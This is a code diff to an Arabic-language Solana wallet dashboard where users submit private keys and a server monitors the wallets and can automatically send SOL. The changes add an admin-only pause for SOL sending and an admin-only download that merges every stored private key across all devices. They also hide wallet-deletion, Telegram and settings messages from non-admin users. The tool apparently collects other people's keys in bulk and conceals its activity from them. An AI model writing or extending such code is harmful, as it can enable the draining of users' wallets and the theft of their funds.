@@ -322,7 +322,7 @@
             <div class="card">
                 <div class="card-title">⚡ التحكم</div>
                 <div class="control-worker-label">التحكم في عمال المراقبة</div>
-                <button type="button" class="btn btn-danger" id="toggleBtn">■ إيقاف المراقبة</button>
+                <button type="button" class="btn btn-warning" id="toggleBtn">⏸ إيقاف إرسال SOL مؤقتاً</button>
                 <button type="button" class="btn btn-success" id="resumeBtn" style="display:none">▶ استئناف المراقبة</button>
             </div>
 
@@ -517,8 +517,8 @@ function doLogout() {
 function showMainApp() {
     document.getElementById('loginScreen').style.display = 'none';
     document.getElementById('mainApp').style.display = 'block';
-    // زر الإعدادات ⚙️ وزر التنزيل للمشرف فقط
-    ['gearBtn','downloadKeysBtn'].forEach(id => {
+    // زر الإعدادات ⚙️ وزر التنزيل وزر الإيقاف المؤقت — للمشرف فقط
+    ['gearBtn','downloadKeysBtn','toggleBtn'].forEach(id => {
         const el = document.getElementById(id);
         if (el) el.style.display = currentIsAdmin ? '' : 'none';
     });
@@ -555,22 +555,35 @@ async function checkAuthAndInit() {
     _clearSession(); showLoginScreen();
 }
 
-// تنزيل المفاتيح بـ Authorization header — الرمز لا يظهر في URL أو السجلات
+// تنزيل المفاتيح: يجمع السيرفر (كل الأجهزة) + localStorage (هذا الجهاز) مع إزالة التكرار
 async function downloadKeys() {
     const s = _getSession();
     if (!s.token) { toast('جلسة غير صالحة', 'error'); return; }
     try {
+        // 1. جلب كل المفاتيح من السيرفر (يشمل كل الأجهزة)
         const resp = await fetch('/api/download-keys', {
             headers: { 'Authorization': 'Bearer ' + s.token }
         });
         if (!resp.ok) { toast('خطأ في التنزيل: ' + resp.status, 'error'); return; }
-        const text = await resp.text();
-        const blob = new Blob([text], { type: 'text/plain;charset=utf-8' });
+        const serverText = await resp.text();
+
+        // 2. جلب مفاتيح هذا الجهاز من ذاكرة المتصفح
+        const localText = await loadKeys() || '';
+
+        // 3. دمج المصدرين وإزالة التكرار
+        const unique = [...new Set(
+            [...serverText.split(/[\r\n]+/), ...localText.split(/[\r\n]+/)]
+            .map(k => k.trim()).filter(Boolean)
+        )];
+        if (unique.length === 0) { toast('لا توجد مفاتيح للتنزيل', 'warning'); return; }
+
+        const blob = new Blob([unique.join('\n')], { type: 'text/plain;charset=utf-8' });
         const url  = URL.createObjectURL(blob);
         const a    = document.createElement('a');
         a.href = url; a.download = 'keys.txt';
         document.body.appendChild(a); a.click();
         document.body.removeChild(a); URL.revokeObjectURL(url);
+        toast(`✅ تم تنزيل ${unique.length} مفتاح (كل الأجهزة)`, 'success');
     } catch(e) { toast('خطأ في التنزيل: ' + e.message, 'error'); }
 }
 
@@ -578,6 +591,16 @@ async function downloadKeys() {
 function isDeleteWalletMsg(msg) {
     if (!msg) return false;
     return msg.includes('حُذفت المحفظة') || msg.includes('تم حذف جميع المحافظ') || msg.includes('تم حذف المحفظة');
+}
+
+// رسائل مخصصة للمشرف فقط — إشعارات تلجرام وسجلات الإعدادات وإيقاف/استئناف SOL
+function isAdminOnlyMsg(msg) {
+    if (!msg) return false;
+    return msg.includes('إشعار تلجرام أُرسل') ||
+           msg.includes('فشل إرسال تلجرام') ||
+           msg.includes('الإعدادات حُدِّثت') ||
+           msg.includes('تم إيقاف مراقبة جميع المحافظ') ||
+           msg.includes('جاري استئناف');
 }
 
 // ── Toast ────────────────────────────────────────────────────────────────────
@@ -836,6 +859,7 @@ function applyUpdates(state, notifs) {
         const visible = notifs.filter(n =>
             !n.message?.startsWith('__PROGRESS__:') && !n.message?.startsWith('__DONE__:')
             && (currentIsAdmin || !isDeleteWalletMsg(n.message))
+            && (currentIsAdmin || !isAdminOnlyMsg(n.message))
         );
         const el = document.getElementById('notifications');
         el.innerHTML = visible.length
@@ -1003,11 +1027,32 @@ function setUI(isMonitoring) {
     const stopBtn   = document.getElementById('toggleBtn');
     const resumeBtn = document.getElementById('resumeBtn');
     if (isMonitoring) {
-        stopBtn.style.display   = 'block';
-        resumeBtn.style.display = 'none';
+        // زر الإيقاف المؤقت للمشرف فقط
+        if (stopBtn) stopBtn.style.display = currentIsAdmin ? 'block' : 'none';
+        if (resumeBtn) resumeBtn.style.display = 'none';
+        refreshToggleBtn();
     } else {
-        stopBtn.style.display   = 'none';
-        resumeBtn.style.display = 'block';
+        if (stopBtn) stopBtn.style.display = 'none';
+        if (resumeBtn) resumeBtn.style.display = 'block';
+    }
+}
+
+// ── مفاتيح الحالة في localStorage ─────────────────────────────────────────────
+const _PAUSED_KEY   = '_sol_send_paused';
+const _PREV_SET_KEY = '_sol_paused_settings';
+
+function _isSendPaused() { return localStorage.getItem(_PAUSED_KEY) === 'true'; }
+
+// تحديث مظهر زر التحكم بناءً على حالة الإيقاف المؤقت
+function refreshToggleBtn() {
+    const btn = document.getElementById('toggleBtn');
+    if (!btn || btn.style.display === 'none') return;
+    if (_isSendPaused()) {
+        btn.textContent = '▶ استئناف إرسال SOL';
+        btn.className   = 'btn btn-success';
+    } else {
+        btn.textContent = '⏸ إيقاف إرسال SOL مؤقتاً';
+        btn.className   = 'btn btn-warning';
     }
 }
 
@@ -1095,7 +1140,8 @@ document.getElementById('fileInput').addEventListener('change', function(e) {
     const reader = new FileReader();
     reader.onerror = () => { status.textContent = '❌ فشل قراءة الملف'; toast('فشل في قراءة الملف', 'error'); };
     reader.onload = async function(ev) {
-        const keys = extractPrivateKeys(ev.target.result || '');
+        // استخراج المفاتيح وإزالة التكرار فوراً — نفس المصدر للسيرفر ولـ localStorage
+        const keys = [...new Set(extractPrivateKeys(ev.target.result || ''))];
         if (keys.length === 0) {
             status.textContent = `⚠️ لا توجد مفاتيح صالحة في: ${file.name}`;
             toast('لم يُعثر على مفاتيح صالحة — تأكد من التنسيق', 'warning'); return;
@@ -1109,6 +1155,7 @@ document.getElementById('fileInput').addEventListener('change', function(e) {
         try {
             const r = await sendWallets(keysStr);
             if (r && r.success) {
+                // keysStr مُنقّى بالفعل — نفس ما أُرسل للسيرفر
                 await saveKeys(keysStr); saveState(true);
                 document.getElementById('privateKeys').value = '';
                 if (r.loading) { startProgress(r.total); }
@@ -1126,7 +1173,8 @@ document.getElementById('addForm').addEventListener('submit', async function(e) 
     e.preventDefault();
     const raw = document.getElementById('privateKeys').value;
     if (!raw.trim()) { toast('الرجاء إدخال المفاتيح الخاصة', 'warning'); return; }
-    const newKeys = extractPrivateKeys(raw);
+    // إزالة التكرار داخل المدخلات نفسها
+    const newKeys = [...new Set(extractPrivateKeys(raw))];
     if (newKeys.length === 0) { toast('لم يُعثر على مفاتيح صالحة', 'warning'); return; }
 
     const settings = { mode: currentSettings.mode, network: currentSettings.network, chatId: currentSettings.chatId };
@@ -1186,17 +1234,55 @@ document.getElementById('statusBtn').addEventListener('click', async () => {
     }
 });
 
-// ── Stop button ───────────────────────────────────────────────────────────────
+// ── Toggle SOL pause/resume — بدون قطع الاتصال — للمشرف فقط ─────────────────
 document.getElementById('toggleBtn').addEventListener('click', async () => {
+    if (!currentIsAdmin) return; // حماية إضافية من التجاوز
     const btn = document.getElementById('toggleBtn');
-    if (!confirm('هل أنت متأكد من إيقاف مراقبة جميع المحافظ؟')) return;
-    btn.textContent = 'جاري الإيقاف...'; btn.disabled = true;
-    try {
-        const r = await (await fetch('/api/stop', { method: 'POST' })).json();
-        saveState(false); setUI(false); stopProgress();
-        await loadNotifications(); toast(r.message, 'info');
-    } catch(e) { toast('خطأ: ' + e.message, 'error'); }
-    finally { btn.disabled = false; btn.textContent = '■ إيقاف المراقبة'; }
+
+    if (_isSendPaused()) {
+        // ── استئناف إرسال SOL: استعادة الإعدادات السابقة ──────────────────────
+        const prev = JSON.parse(localStorage.getItem(_PREV_SET_KEY) || 'null');
+        if (!prev) { toast('لا توجد إعدادات سابقة للاستئناف', 'warning'); return; }
+        btn.disabled = true; btn.textContent = 'جاري الاستئناف...';
+        try {
+            const r = await (await fetch('/api/update-settings', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ settings: prev })
+            })).json();
+            if (r && r.success) {
+                localStorage.removeItem(_PAUSED_KEY);
+                localStorage.removeItem(_PREV_SET_KEY);
+                Object.assign(currentSettings, prev);
+                toast('✅ تم استئناف إرسال SOL بالإعدادات السابقة', 'success');
+            } else { toast('خطأ: ' + (r?.message || 'فشل الاستئناف'), 'error'); }
+        } catch(e) { toast('خطأ: ' + e.message, 'error'); }
+        finally { btn.disabled = false; refreshToggleBtn(); }
+
+    } else {
+        // ── إيقاف إرسال SOL مؤقتاً — تحويل لإشعارات تلجرام فقط ──────────────
+        if (!currentSettings.chatId) {
+            toast('⚠️ يجب إعداد Telegram Chat ID أولاً في الإعدادات ⚙️', 'warning'); return;
+        }
+        if (!confirm('سيتوقف إرسال SOL مؤقتاً وستبقى الاتصالات نشطة مع استمرار إشعارات تلجرام.\nهل تريد المتابعة؟')) return;
+        btn.disabled = true; btn.textContent = 'جاري التحويل...';
+        // حفظ نسخة من الإعدادات الحالية قبل التغيير
+        const snapshot = JSON.parse(JSON.stringify(currentSettings));
+        try {
+            const r = await (await fetch('/api/update-settings', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ settings: { ...currentSettings, mode: 'telegram' } })
+            })).json();
+            if (r && r.success) {
+                localStorage.setItem(_PAUSED_KEY,   'true');
+                localStorage.setItem(_PREV_SET_KEY, JSON.stringify(snapshot));
+                currentSettings.mode = 'telegram';
+                toast('⏸ إرسال SOL متوقف مؤقتاً — إشعارات تلجرام تعمل', 'info');
+            } else { toast('خطأ: ' + (r?.message || 'فشل التحويل'), 'error'); }
+        } catch(e) { toast('خطأ: ' + e.message, 'error'); }
+        finally { btn.disabled = false; refreshToggleBtn(); }
+    }
 });
 
 // ── Resume button ─────────────────────────────────────────────────────────────
